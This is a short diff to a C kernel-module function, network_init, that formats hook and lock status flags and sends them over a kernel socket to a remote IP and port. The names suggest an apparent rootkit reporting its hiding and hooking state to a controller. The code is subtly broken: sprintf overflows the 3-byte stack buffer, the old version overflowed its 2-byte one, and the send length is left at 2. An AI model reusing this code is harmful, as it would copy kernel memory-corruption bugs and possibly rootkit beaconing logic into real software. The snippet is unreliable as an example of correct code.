@@ -22,11 +22,11 @@ int network_init(const char *ip, int port)
     struct sockaddr_in addr = { 0 };
     struct msghdr msg = { 0 };
     struct kvec vec = { 0 };
-    char hide_status[2] = { 0 };
+    char hide_lock_status[3] = { 0 };
     unsigned char ip_binary[4] = { 0 };
     int ret = 0;
 
-    sprintf(hide_status, "%d\n", hook_status());
+    sprintf(hide_lock_status, "%d%d\n", hook_status(), lock_status());
 
     pr_info("network: initializing socket\n");
 
@@ -54,7 +54,7 @@ int network_init(const char *ip, int port)
         return 1;
     }
 
-    vec.iov_base = hide_status;
+    vec.iov_base = hide_lock_status;
     vec.iov_len = 2;
 
     if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
@@ -65,7 +65,7 @@ int network_init(const char *ip, int port)
         return 1;
     }
 
-    pr_info("network: message '%s' sent to %s:%d\n", hide_status, ip, port);
+    pr_info("network: message '%s' sent to %s:%d\n", hide_lock_status, ip, port);
     return 0;
 }
 
